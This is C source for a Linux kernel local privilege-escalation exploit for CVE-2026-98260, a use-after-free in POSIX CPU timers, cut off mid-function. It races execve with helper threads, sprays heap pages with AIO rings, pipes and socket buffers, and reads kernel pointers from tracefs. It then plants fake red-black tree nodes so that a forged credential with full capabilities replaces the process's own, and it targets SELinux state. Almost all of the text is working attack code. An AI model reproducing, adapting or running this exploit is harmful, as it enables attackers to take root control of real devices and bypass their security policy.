/* Park a CVE-2026-98260 zombie, reclaim its timer page with the pipe+AIO
 * path, plant an rb node, and reap. Fail closed: no waitpid unless the
 * filemap line count proves which ring owns the node page.
 */
#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
#define CPU0_TRACE TRACE "/per_cpu/cpu0/trace"
#define PAGE_OFFSET UINT64_C(0xffffff8000000000)
#define TIMER_LINK UINT64_C(0xffffffc0803a726c)
#define CRED_LINK UINT64_C(0xffffffc08026d1b4)
#define SELINUX_LINK UINT64_C(0xffffffc082959630)
#define LINK_USER_NS UINT64_C(0xffffffc0826d10d8)
#define LINK_ROOT_USER UINT64_C(0xffffffc0826d1388)
#define LINK_GROUPS UINT64_C(0xffffffc0826d2a48)
#define LINK_UCOUNTS UINT64_C(0xffffffc0826d2f08)
#define FULLCAP UINT64_C(0x1ffffffffff)
#define TASK_CRED 0x908

static uint64_t g_slide = 0;

static uint64_t slide_addr(uint64_t link)
{
	return link + g_slide;
}
#define KITIMER_NODE 0xe0
/* The planted cred starts past the 24-byte rb_node, so the erase cannot
   scribble over any identity field (see the tile in reclaim_stream). */
#define CRED_OFF 0x20
/* One UAF is enough. posix_cpu_timers_exit() drains three rb trees in a row --
   CPUCLOCK_PROF, VIRT, SCHED -- and each tree's leftmost node is an object we
   own once the slab is reclaimed. Arming one timer per base inside a single
   8 KB slab therefore turns one reclaim into three independent rb_erase()
   calls, each with its own parent/value pair taken straight from our page. */
#define TILE_NONE 0
#define TILE_CRED 1
#define TILE_SELINUX 2
static timer_t g_tids[2048];
static int g_tile_kind[3];
static unsigned g_tile_off[3];
static int g_bases[3];
static int g_tiles_on;

static clockid_t thread_clock(int base)
{
	/* MAKE_THREAD_CPUCLOCK(gettid(), base) with CPUCLOCK_PERTHREAD_MASK set:
	   base 0 = PROF, 1 = VIRT, 2 = SCHED. Without the 4 bit the kernel decodes
	   the id as a *group* clock and rejects a non-leader tid with EINVAL. */
	pid_t tid = (pid_t)syscall(SYS_gettid);
	return (clockid_t)((~(long)tid << 3) | 4 | base);
}
#define NFILL 42
#define NFLUSH 2048
#define MAX_RINGS 9000
#define MAX_PIPES 400
#define NVMA 50000
#define F_SETPIPE_SZ 1031
#ifndef WNOWAIT
#define WNOWAIT 0x01000000
#endif

static _Atomic int g_go;
static _Atomic int g_stop;
static _Atomic int g_lockers;
static _Atomic int g_in_mprotect;
static _Atomic int g_exec_tid;
static _Atomic int g_mprotect_reported;
static void *g_vmas;
static size_t g_vmalen;

struct ipc {
	atomic_int phase;
	atomic_int arm_ready;
	int arm_idx[3];
	int helpers[4];
	int nhelpers;
};
static struct ipc *ipc;

static uint64_t g_all[2200];
static int g_all_n;
static int g_pipes[MAX_PIPES][2];
static int g_npipes;
static uint64_t *g_ctx;
static int g_nrings;

static void on_alarm(int sig)
{
	(void)sig;
}

static int write_file_mode(const char *path, const char *text, int extra)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC | extra);
	ssize_t n;
	if (fd < 0)
		return -1;
	n = write(fd, text, strlen(text));
	close(fd);
	return n == (ssize_t)strlen(text) ? 0 : -1;
}

static int write_file(const char *path, const char *text)
{
	return write_file_mode(path, text, 0);
}

static int trigger_cmd(const char *text)
{
	if (!write_file(TRIGGER, text))
		return 0;
	return errno == EEXIST ? 0 : -1;
}

static int kick_rss(void)
{
	unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n"))
		return -1;
	if (page != MAP_FAILED) {
		((volatile unsigned char *)page)[0] = 1;
		munmap(page, 4096);
	}
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	return 0;
}

static void disarm(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static void quiet_reclaim_trace(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:mm_page_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_alloc\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static int trace_off_on(void)
{
	if (write_file(TRACE "/tracing_on", "0\n") ||
	    write_file_mode(TRACE "/trace", "", O_TRUNC))
		return -1;
	return write_file(TRACE "/tracing_on", "1\n");
}

static uint64_t object_pfn(uint64_t ptr)
{
	return ((ptr & ~UINT64_C(0xfff)) - PAGE_OFFSET) >> 12;
}

static uint64_t g_watch[4500];
static int g_nwatch;

static int cmp_u64(const void *a, const void *b)
{
	uint64_t x = *(const uint64_t *)a;
	uint64_t y = *(const uint64_t *)b;
	return (x > y) - (x < y);
}

static void build_watch(void)
{
	int w = 0;
	g_nwatch = 0;
	for (int i = 0; i < g_all_n && g_nwatch + 2 < (int)(sizeof(g_watch) / sizeof(g_watch[0])); i++) {
		g_watch[g_nwatch++] = object_pfn(g_all[i] + KITIMER_NODE);
		g_watch[g_nwatch++] = object_pfn(g_all[i]) & ~UINT64_C(1);
	}
	qsort(g_watch, (size_t)g_nwatch, sizeof(g_watch[0]), cmp_u64);
	for (int i = 0; i < g_nwatch; i++) {
		if (w && g_watch[w - 1] == g_watch[i])
			continue;
		g_watch[w++] = g_watch[i];
	}
	g_nwatch = w;
}

static int watch_has(uint64_t pfn)
{
	return bsearch(&pfn, g_watch, (size_t)g_nwatch, sizeof(pfn), cmp_u64) != NULL;
}

static int cpu_count(void);

static int pfn_in_line(const char *line, uint64_t pfn)
{
	const char *p = strstr(line, "pfn=0x");
	char *end = NULL;
	uint64_t got;
	if (!p)
		return 0;
	got = strtoull(p + 6, &end, 16);
	if (end == p + 6)
		return 0;
	return got == pfn;
}

static int trace_seen(const char *kind, uint64_t pfn)
{
	int ncpu = cpu_count();
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			if (strstr(line, kind) && pfn_in_line(line, pfn)) {
				fclose(file);
				return 1;
			}
		}
		fclose(file);
	}
	return 0;
}

static uint64_t parse_pfn(const char *line)
{
	const char *p = strstr(line, "pfn=0x");
	if (!p)
		return UINT64_MAX;
	return strtoull(p + 6, NULL, 16);
}

static int cpu_count(void)
{
	char buf[128];
	char *p;
	int fd, n = 0;
	ssize_t got;
	memset(buf, 0, sizeof(buf));
	fd = open("/sys/devices/system/cpu/present", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 8;
	got = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (got <= 0)
		return 8;
	for (p = buf; *p; ) {
		int v = 0;
		if (*p < '0' || *p > '9') {
			p++;
			continue;
		}
		while (*p >= '0' && *p <= '9')
			v = v * 10 + (*p++ - '0');
		if (v + 1 > n)
			n = v + 1;
	}
	if (n < 1)
		return 8;
	return n > 16 ? 16 : n;
}

static int g_socks[256][2];
static int g_nsocks;

static void close_socks(void)
{
	for (int i = 0; i < g_nsocks; i++) {
		close(g_socks[i][0]);
		close(g_socks[i][1]);
	}
	g_nsocks = 0;
}

static unsigned long drain_socks(void)
{
	unsigned char buf[65536];
	unsigned long total = 0;
	memset(buf, 0x42, sizeof(buf));
	g_nsocks = 0;
	for (int i = 0; i < 256 && total < (4UL << 30); i++) {
		int sz = 16 << 20;
		int wrote = 0;
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_socks[i]))
			break;
		setsockopt(g_socks[i][0], SOL_SOCKET, SO_SNDBUF, &sz, sizeof(sz));
		setsockopt(g_socks[i][1], SOL_SOCKET, SO_RCVBUF, &sz, sizeof(sz));
		if (fcntl(g_socks[i][0], F_SETFL, O_NONBLOCK)) {
			close(g_socks[i][0]);
			close(g_socks[i][1]);
			break;
		}
		while (wrote < (16 << 20)) {
			ssize_t n = write(g_socks[i][0], buf, sizeof(buf));
			if (n < 0)
				break;
			wrote += (int)n;
		}
		if (!wrote) {
			close(g_socks[i][0]);
			close(g_socks[i][1]);
			break;
		}
		total += (unsigned long)wrote;
		g_nsocks++;
	}
	dprintf(STDOUT_FILENO, "[sock] pairs=%d MiB=%lu\n", g_nsocks, total >> 20);
	return total;
}

static int pin_cpu(int cpu)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	return sched_setaffinity(0, sizeof(set), &set);
}

static unsigned long drain_pipes(void)
{
	unsigned char buf[65536];
	unsigned long total = 0;
	memset(buf, 0x41, sizeof(buf));
	g_npipes = 0;
	int cpus = cpu_count();
	for (int i = 0; i < MAX_PIPES && total < (80UL << 20); i++) {
		int cap, wrote = 0;
		pin_cpu(i % cpus);
		if (pipe(g_pipes[i]))
			break;
		cap = fcntl(g_pipes[i][1], F_SETPIPE_SZ, 1 << 20);
		if (cap < 0)
			cap = 65536;
		if (fcntl(g_pipes[i][1], F_SETFL, O_NONBLOCK)) {
			close(g_pipes[i][0]);
			close(g_pipes[i][1]);
			break;
		}
		while (wrote < cap) {
			size_t chunk = sizeof(buf);
			ssize_t n;
			if (chunk > (size_t)(cap - wrote))
				chunk = (size_t)(cap - wrote);
			n = write(g_pipes[i][1], buf, chunk);
			if (n < 0) {
				if (errno == EAGAIN)
					break;
				close(g_pipes[i][0]);
				close(g_pipes[i][1]);
				dprintf(STDOUT_FILENO, "[drain] write errno=%d\n", errno);
				return total;
			}
			wrote += (int)n;
			total += (unsigned long)n;
		}
		g_npipes++;
	}
	dprintf(STDOUT_FILENO, "[drain] pipes=%d MiB=%lu\n", g_npipes, total >> 20);
	return total;
}

static int read_raw(uint8_t *buf, size_t cap, size_t *used, size_t limit)
{
	int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw",
		      O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	int budget;
	if (fd < 0)
		return -1;
	/* poll() on trace_pipe_raw is not trustworthy, and a blocking read costs
	   the whole alarm budget. Spin on EAGAIN with a 1 ms nap instead: the
	   records are already in the ring buffer by the time we get here. */
	budget = limit ? 120 : 150;
	while (budget-- > 0 && *used + 4096 < cap) {
		ssize_t n = read(fd, buf + *used, cap - *used);
		if (n > 0) {
			*used += (size_t)n;
			if (limit && *used >= limit)
				break;
			budget = limit ? 120 : 150;
			continue;
		}
		if (n == 0)
			break;
		if (errno != EAGAIN && errno != EINTR) {
			close(fd);
			return -1;
		}
		usleep(1000);
	}
	close(fd);
	return 0;
	close(fd);
	return 0;
}

static int collect_nth(int index, int *count, uint64_t *chosen)
{
	uint8_t *buf = malloc(8U << 20);
	size_t used = 0;
	uint8_t needle[8];
	uint64_t site = slide_addr(TIMER_LINK);
	int fd, n = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	*chosen = 0;
	if (read_raw(buf, 8U << 20, &used, 0)) {
		free(buf);
		return -1;
	}
	fd = 0; /* the shared reader owns the fd now */
	for (size_t i = 0; i + 32 <= used; i++) {
		uint64_t got, ptr, req;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&got, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 24, 8);
		if (got != site || req != 0x180 || (ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		if (n < (int)(sizeof(g_all) / sizeof(g_all[0])))
			g_all[n] = ptr;
		*chosen = (n == index) ? ptr : *chosen;
		n++;
	}
	free(buf);
	*count = n;
	g_all_n = n;
	dprintf(STDOUT_FILENO, "[uaf] captured=%d chosen=%#" PRIx64 " raw=%zu\n",
		n, *chosen, used);
	return (n > index && *chosen) ? 0 : -1;
}

static int collect_site(uint64_t site, uint64_t bytes, uint64_t *ptrs, int cap)
{
	uint8_t *buf = malloc(4U << 20);
	size_t used = 0;
	uint8_t needle[8];
	int n = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	if (read_raw(buf, 4U << 20, &used, 0)) {
		free(buf);
		return -1;
	}
	for (size_t i = 0; i + 32 <= used && n < cap; i++) {
		uint64_t got, ptr, req;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&got, buf + i, 8);
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 24, 8);
		if (got != site || req != bytes)
			continue;
		if ((ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		ptrs[n++] = ptr;
	}
	free(buf);
	return n;
}

static int text_has_comm(const char *comm)
{
	FILE *file = fopen(CPU0_TRACE, "r");
	char line[768];
	int n = 0;
	if (!file)
		return -1;
	while (fgets(line, sizeof(line), file)) {
		if (strstr(line, "do_timer_create") && strstr(line, comm))
			n++;
	}
	fclose(file);
	return n;
}

static int prepare_vmas(void)
{
	long page = 4096;
	int fd = (int)syscall(SYS_memfd_create, "v", MFD_CLOEXEC);
	void *base;
	if (fd < 0 || ftruncate(fd, page))
		return -1;
	g_vmalen = (size_t)NVMA * (size_t)page;
	base = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED)
		return -1;
	for (int i = 0; i < NVMA; i++) {
		void *at = (char *)base + (size_t)i * (size_t)page;
		if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != at)
			return -1;
	}
	close(fd);
	g_vmas = base;
	return 0;
}

#define HELPER_STACK (1 << 20)

static int spawn_helper(int (*fn)(void *), void *arg)
{
	void *stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
	int pid;
	if (stack == MAP_FAILED)
		return -1;
	pid = clone(fn, (char *)stack + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
	return pid;
}

static int locker_fn(void *arg)
{
	int prot = PROT_NONE;
	(void)arg;
	while (!atomic_load_explicit(&g_go, memory_order_acquire)) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	atomic_fetch_add_explicit(&g_lockers, 1, memory_order_release);
	while (!atomic_load_explicit(&g_stop, memory_order_acquire)) {
		int rc;
		atomic_store_explicit(&g_in_mprotect, 1, memory_order_release);
		rc = mprotect(g_vmas, g_vmalen, prot);
		atomic_store_explicit(&g_in_mprotect, 0, memory_order_release);
		if (rc && atomic_exchange_explicit(&g_mprotect_reported, 1, memory_order_relaxed) == 0)
			dprintf(STDOUT_FILENO, "[locker] mprotect errno=%d\n", errno);
		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
	}
	return 0;
}

static int killer_fn(void *arg)
{
	int tgid = (int)(intptr_t)arg;
	int old;
	while (!(old = atomic_load_explicit(&g_exec_tid, memory_order_acquire))) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	for (;;) {
		if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH)
			break;
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
	}
	syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	dprintf(STDOUT_FILENO, "[killer] SIGKILL tgid=%d old=%d errno=%d\n",
		tgid, old, errno);
	return 0;
}

static void *exec_fn(void *arg)
{
	struct sigevent event;
	struct itimerspec spec;
	timer_t id;
	char *argv[] = { (char *)"uaf_plant", (char *)"--exec-ok", NULL };
	(void)arg;
	struct sigevent armed_event;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	memset(&armed_event, 0, sizeof(armed_event));
	armed_event.sigev_notify = SIGEV_SIGNAL;
	armed_event.sigev_signo = SIGRTMIN;
	memset(&spec, 0, sizeof(spec));
	spec.it_value.tv_sec = 3600;
	if (pin_cpu(0))
		_exit(116);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 2) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(124);
		sched_yield();
	}
	int made = 0;
	for (int i = 0; i < 2048; i++) {
		timer_t extra;
		if (timer_create(thread_clock(i % 3), &armed_event, &extra))
			_exit(120);
		g_tids[i] = extra;
		made++;
	}
	if (made < 2048)
		_exit(120);
	atomic_store_explicit(&g_exec_tid, (int)syscall(SYS_gettid), memory_order_release);
	atomic_store_explicit(&ipc->phase, 3, memory_order_release);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 4) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(125);
		sched_yield();
	}
	while (atomic_load_explicit(&ipc->arm_ready, memory_order_acquire) == 0) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(125);
		sched_yield();
	}
	for (int i = 0; i < 3; i++) {
		int idx = ipc->arm_idx[i];
		if (idx < 0 || idx >= 2048)
			continue;
		if (timer_settime(g_tids[idx], 0, &spec, NULL))
			_exit(120);
	}
	dprintf(STDOUT_FILENO, "[exec] armed %d/%d/%d\n", ipc->arm_idx[0],
		ipc->arm_idx[1], ipc->arm_idx[2]);
	atomic_store_explicit(&g_go, 1, memory_order_release);
	while (atomic_load_explicit(&g_in_mprotect, memory_order_acquire) == 0) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(123);
		sched_yield();
	}
	dprintf(STDOUT_FILENO, "[exec] begin tid=%ld\n", (long)syscall(SYS_gettid));
	execve("/proc/self/exe", argv, NULL);
	_exit(122);
}

static int child_race(void)
{
	pthread_t exec_thread;
	sigset_t block;
	int tgid = (int)getpid();
	sigemptyset(&block);
	sigaddset(&block, SIGRTMIN);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (prepare_vmas())
		_exit(110);
	dprintf(STDOUT_FILENO, "[child] vmas ready pid=%d\n", getpid());
	if (pin_cpu(1))
		_exit(115);
	for (int i = 0; i < 3; i++) {
		int pid = spawn_helper(locker_fn, NULL);
		if (pid < 0)
			_exit(111);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	{
		int pid = spawn_helper(killer_fn, (void *)(intptr_t)tgid);
		if (pid < 0)
			_exit(112);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	if (pthread_create(&exec_thread, NULL, exec_fn, NULL))
		_exit(114);
	atomic_store_explicit(&ipc->phase, 1, memory_order_release);
	for (;;)
		pause();
}

static int wait_phase(int want)
{
	for (int i = 0; i < 600; i++) {
		struct timespec pause = { .tv_nsec = 50000000 };
		if (atomic_load_explicit(&ipc->phase, memory_order_acquire) >= want)
			return 0;
		nanosleep(&pause, NULL);
	}
	return -1;
}

static void stop_helpers(void)
{
	if (!ipc)
		return;
	for (int i = 0; i < ipc->nhelpers && i < 4; i++) {
		if (ipc->helpers[i] > 0)
			kill(ipc->helpers[i], SIGKILL);
	}
}
static int wait_zombie(pid_t child, int *status_out)
{
	for (int i = 0; i < 400; i++) {
		siginfo_t info;
		struct timespec pause = { .tv_nsec = 50000000 };
		memset(&info, 0, sizeof(info));
		if (waitid(P_PID, (id_t)child, &info, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (info.si_pid == child) {
			*status_out = info.si_status;
			return info.si_code;
		}
		nanosleep(&pause, NULL);
	}
	return 0;
}

static int line_has_pfn(const char *line, uint64_t pfn)
{
	char exact[40];
	char *hit;
	int n = snprintf(exact, sizeof(exact), "pfn=0x%" PRIx64, pfn);
	if (n <= 0)
		return 0;
	hit = strstr(line, exact);
	if (!hit)
		return 0;
	{
		char end = hit[n];
		if ((end >= '0' && end <= '9') ||
		    (end >= 'a' && end <= 'f') ||
		    (end >= 'A' && end <= 'F'))
			return 0;
	}
	return 1;
}

static int raw_has_ptr(uint64_t ptr)
{
	uint8_t needle[8];
	int cpu;
	memcpy(needle, &ptr, 8);
	for (cpu = 0; cpu < 8; cpu++) {
		char path[128];
		uint8_t *buf = malloc(8U << 20);
		size_t used = 0;
		int fd;
		if (!buf)
			return -1;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_CLOEXEC);
		if (fd >= 0) {
			alarm(2);
			while (used + 4096 < (8U << 20)) {
				ssize_t n = read(fd, buf + used, (8U << 20) - used);
				if (n < 0) {
					if (errno == EINTR)
						break;
					break;
				}
				if (n == 0)
					break;
				used += (size_t)n;
			}
			alarm(0);
			close(fd);
		}
		dprintf(STDOUT_FILENO, "[freeobj] cpu%d raw_bytes=%zu\n", cpu, used);
		for (size_t i = 0; i + 8 <= used; i++) {
			if (!memcmp(buf + i, needle, 8)) {
				free(buf);
				dprintf(STDOUT_FILENO, "[freeobj] ptr on cpu%d raw_bytes=%zu\n",
					cpu, used);
				return 1;
			}
		}
		free(buf);
	}
	return 0;
}

static int flush_timers(void)
{
	struct sigevent event;
	timer_t *ids = calloc(NFLUSH, sizeof(*ids));
	int created = 0;
	if (!ids)
		return -1;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	for (int i = 0; i < NFLUSH; i++) {
		if (timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &ids[i]))
			break;
		created++;
	}
	for (int i = 0; i < created; i++)
		timer_delete(ids[i]);
	free(ids);
	dprintf(STDOUT_FILENO, "[flush] deleted=%d\n", created);
	return created >= 256 ? 0 : -1;
}

#define MAX_CPU 16
#define PER_CPU_RINGS 512
static uint64_t g_cpu_ctx[MAX_CPU][PER_CPU_RINGS];
static int g_cpu_n[MAX_CPU];
static int g_cpu_lines[MAX_CPU];
static int g_hit_cpu = -1;
static int g_hit_index = -1;

static void destroy_rings(void)
{
	for (int cpu = 0; cpu < MAX_CPU; cpu++) {
		for (int i = 0; i < g_cpu_n[cpu]; i++)
			syscall(SYS_io_destroy, g_cpu_ctx[cpu][i]);
		g_cpu_n[cpu] = 0;
	}
	g_nrings = 0;
}

static void *spray_cpu(void *arg)
{
	int cpu = (int)(intptr_t)arg;
	struct timespec pause = { .tv_nsec = 400000000 };
	if (pin_cpu(cpu))
		return NULL;
	while (!atomic_load_explicit(&g_stop, memory_order_acquire) &&
	       g_cpu_n[cpu] < PER_CPU_RINGS) {
		int batch = 0;
		for (int i = 0; i < 32 && g_cpu_n[cpu] < PER_CPU_RINGS; i++) {
			uint64_t ctx = 0;
			if (syscall(SYS_io_setup, 1, &ctx)) {
				dprintf(STDOUT_FILENO, "[aio] cpu%d stop errno=%d n=%d\n",
					cpu, errno, g_cpu_n[cpu]);
				return NULL;
			}
			g_cpu_ctx[cpu][g_cpu_n[cpu]++] = ctx;
			batch++;
		}
		if (!batch)
			break;
		nanosleep(&pause, NULL);
	}
	return NULL;
}

static int reclaim_and_plant(uint64_t victim, uint64_t target)
{
	uint64_t node_addr = victim + KITIMER_NODE;
	uint64_t node_pfn = object_pfn(node_addr);
	unsigned node_off = (unsigned)(node_addr & 0xfff);
	pthread_t threads[MAX_CPU];
	int ncpu, other = 0, rings = 0, free_hits = 0, alloc_hits = 0;
	int shown = 0, victim_frees = 0;
	uint64_t victim_base;
	if (node_off + 24 > 4096) {
		dprintf(STDOUT_FILENO, "[plant] node crosses a page off=%#x\n", node_off);
		return -1;
	}
	build_watch();
	victim_base = node_pfn & ~UINT64_C(1);
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[aio] cpus=%d watch=%d node_pfn=%#" PRIx64 "\n",
		ncpu, g_nwatch, node_pfn);
	if (write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "1\n"))
		return -1;
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	if (trace_off_on() || kick_rss())
		return -1;
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	for (int cpu = 0; cpu < ncpu; cpu++) {
		if (pthread_create(&threads[cpu], NULL, spray_cpu, (void *)(intptr_t)cpu))
			ncpu = cpu;
	}
	for (int cpu = 0; cpu < ncpu; cpu++)
		pthread_join(threads[cpu], NULL);
	write_file(TRACE "/tracing_on", "0\n");
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		int lines = 0;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			uint64_t pfn = parse_pfn(line);
			int filemap = strstr(line, "mm_filemap_add_to_page_cache:") &&
				      strstr(line, "uaf_plant");
			if (strstr(line, "mm_page_free:") && pfn != UINT64_MAX && watch_has(pfn)) {
				free_hits++;
				if (pfn == victim_base || pfn == node_pfn)
					victim_frees++;
				if (shown < 4) {
					dprintf(STDOUT_FILENO, "[free] %s", line);
					shown++;
				}
			}
			if (strstr(line, "mm_page_alloc:") && pfn != UINT64_MAX && watch_has(pfn)) {
				alloc_hits++;
				if (shown < 10) {
					dprintf(STDOUT_FILENO, "[alloc] %s", line);
					shown++;
				}
			}
			if (!filemap)
				continue;
			if (g_hit_index < 0 && pfn == node_pfn) {
				g_hit_cpu = cpu;
				g_hit_index = lines;
			} else if (g_hit_index < 0 && pfn != UINT64_MAX && watch_has(pfn))
				other++;
			lines++;
		}
		fclose(file);
		g_cpu_lines[cpu] = lines;
		rings += g_cpu_n[cpu];
		dprintf(STDOUT_FILENO, "[aio] cpu%d rings=%d filemap=%d\n",
			cpu, g_cpu_n[cpu], lines);
	}
	g_nrings = rings;
	if (g_hit_index >= 0 && g_hit_cpu >= 0 &&
	    g_cpu_lines[g_hit_cpu] == g_cpu_n[g_hit_cpu] &&
	    g_hit_index < g_cpu_n[g_hit_cpu]) {
		uint32_t *ring = (uint32_t *)(uintptr_t)g_cpu_ctx[g_hit_cpu][g_hit_index];
		uint64_t *node;
		if (ring[4] != UINT32_C(0xa10a10a1)) {
			dprintf(STDOUT_FILENO, "[aio] bad magic %#x\n", ring[4]);
			return -1;
		}
		node = (uint64_t *)((char *)ring + node_off);
		node[0] = 0;
		node[1] = 0;
		node[2] = target;
		__sync_synchronize();
		dprintf(STDOUT_FILENO,
			"[plant] cpu=%d ring=%d ctx=%p off=%#x target=%#" PRIx64 "\n",
			g_hit_cpu, g_hit_index, (void *)ring, node_off, target);
		quiet_reclaim_trace();
		return 0;
	}
	dprintf(STDOUT_FILENO,
		"[aio] victim page missed rings=%d other_timer_pages=%d page_frees=%d page_allocs=%d victim_frees=%d\n",
		rings, other, free_hits, alloc_hits, victim_frees);
	quiet_reclaim_trace();
	return -1;
}

static unsigned long *g_hold;
static int g_nhold;
static pid_t g_holders[4];

static int hold_aio_children(void)
{
	int ready[2];
	if (pipe(ready))
		return -1;
	for (int i = 0; i < 4; i++) {
		pid_t pid = fork();
		if (pid < 0)
			return -1;
		if (pid == 0) {
			int n = 0;
			close(ready[0]);
			while (n < 20000) {
				unsigned long ctx = 0;
				if (syscall(SYS_io_setup, 1, &ctx))
					break;
				n++;
			}
			dprintf(STDOUT_FILENO, "[hold] child=%d rings=%d errno=%d\n",
				i, n, errno);
			if (write(ready[1], "x", 1) != 1)
				_exit(1);
			for (;;)
				pause();
		}
		g_holders[i] = pid;
	}
	close(ready[1]);
	for (int i = 0; i < 4; i++) {
		char bit;
		if (read(ready[0], &bit, 1) != 1)
			return -1;
	}
	close(ready[0]);
	return 0;
}
static int g_nhold;

static int drain_aio(void)
{
	g_hold = calloc(70000, sizeof(*g_hold));
	g_nhold = 0;
	if (!g_hold)
		return -1;
	while (g_nhold < 70000) {
		unsigned long ctx = 0;
		if (syscall(SYS_io_setup, 1, &ctx))
			break;
		g_hold[g_nhold++] = ctx;
	}
	dprintf(STDOUT_FILENO, "[aio-hold] rings=%d errno=%d\n", g_nhold, errno);
	return g_nhold > 1000 ? 0 : -1;
}

static void free_aio_hold(void)
{
	for (int i = 0; i < g_nhold; i++)
		syscall(SYS_io_destroy, g_hold[i]);
	g_nhold = 0;
	free(g_hold);
	g_hold = NULL;
}
static int g_catch[1024][2];
static int g_ncatch;

static int prepare_catch(void)
{
	g_ncatch = 0;
	for (int i = 0; i < 1024; i++) {
		if (pipe(g_catch[i]))
			break;
		if (fcntl(g_catch[i][1], F_SETFL, O_NONBLOCK)) {
			close(g_catch[i][0]);
			close(g_catch[i][1]);
			break;
		}
		g_ncatch++;
	}
	dprintf(STDOUT_FILENO, "[pipe] empty=%d\n", g_ncatch);
	return g_ncatch >= 128 ? 0 : -1;
}

static int reclaim_pipe(uint64_t victim, uint64_t target)
{
